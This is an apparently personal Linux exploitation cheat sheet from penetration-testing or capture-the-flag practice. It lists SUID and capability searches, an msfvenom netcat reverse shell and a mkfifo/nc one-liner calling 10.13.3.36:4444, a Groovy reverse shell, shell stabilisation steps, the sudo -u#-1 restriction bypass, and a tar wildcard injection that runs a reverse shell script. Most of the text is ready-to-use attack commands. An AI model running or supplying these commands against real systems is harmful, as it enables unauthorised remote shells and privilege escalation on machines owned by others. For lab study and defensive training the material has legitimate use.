# Linux Exploitation

## Enumerate Linux Machine
* [LinEnum](https://github.com/rebootuser/LinEnum)
* [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite): 
    * `./linpeas.sh | tee enum.txt` 
    * `less -r enum.txt`

## Find Interesting Files
* Find File With uuid Permission
    * `find / -perm /u=s 2>/dev/null`
    * `find / -perm /4000 2>/dev/null`
* Files With Capabilities
    * `getcap -r / 2>/dev/null`


## Generate reverse ncat
* `msfvenom -p cmd/unix/reverse_netcat lhost=10.13.3.36 lport=4444`
    * `mkfifo /tmp/kirxhbg; nc 10.13.3.36 4444 0</tmp/kirxhbg | /bin/sh >/tmp/kirxhbg 2>&1; rm /tmp/kirxhbg`
* Listener: `nc -klvnp 4444`
    * k - Wait for more connections after completion
    * l - Listen for connection
    * v - Verbose
    * n - Don't do DNS lookup
    * p - Port to listen to

## Reverse Shells

### PHP Reverse Shells
* phpbash (webshell): https://github.com/Arrexel/phpbash
* php-reverse-shell.php : https://github.com/pentestmonkey/php-reverse-shell
* #!/usr/bin/env php

### Groovy Reverse Shell
```groovy
String host="10.13.3.36";
int port=4444;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

## Stabilisation of Shell
```sh
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```
CTRL-z
```sh
stty raw -echo;fg
```

https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/


## sudo
* List sudo Permisions
    * `sudo -l`
* Abuse sudo with (ALL, !root)
    * `sudo -u#-1`

## Abuse tar With Wildcard *
```sh
echo "mkfifo /tmp/kirxhbg; nc 10.13.3.36 4444 0</tmp/kirxhbg | /bin/sh >/tmp/kirxhbg 2>&1; rm /tmp/kirxhbg" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```
